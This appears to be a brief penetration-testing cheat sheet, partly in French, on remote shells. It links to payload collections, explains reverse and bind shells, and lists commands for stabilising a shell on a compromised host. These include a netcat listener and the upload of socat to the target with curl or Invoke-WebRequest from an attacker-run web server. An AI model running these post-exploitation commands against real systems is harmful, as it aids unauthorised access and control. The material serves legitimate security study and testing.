---
title: "Remote Shells"
---

<p style="text-align: right">_- last update 11/03/2022 -_</p>

Where to find good shell payload depending on the technology:

* [SeclLists](https://github.com/danielmiessler/SecLists)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Two types of shells:

* **Reverse shells** : target => hacker
* **Bind shells** : hacker => target

Stabiliser un shell linux:

```bash
python -c 'import pty;pty.spawn("/bin/bash")' # obtenir un shell bash stable
export TERM=xterm                             # activer les controle console
^Z                                            # mettre le shell en background
stty raw -echo; fg                            # désactiver stdout du shell hôte
```

Stabiliser un shell windows (ou linux) avec
[rlwrap](https://github.com/hanslub42/rlwrap):

```bash
# utiliser readlinewrapper
rlwrap nc -lvnp <port>
```

Stabiliser un shell avec socat (windows ou linux):

```bash
# on veux upload socat sur la machine cible
sudo python3 -m http.server 80      # pirate
# target (linux)
curl -o /tmp/socat <LOCAL-IP>/socat
# target (windows)
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

Pour changer la taille du terminal virtuel, utiliser `stty`.

```bash
stty -a
stty rows <nbrows>
stty cols <nbcols>
```

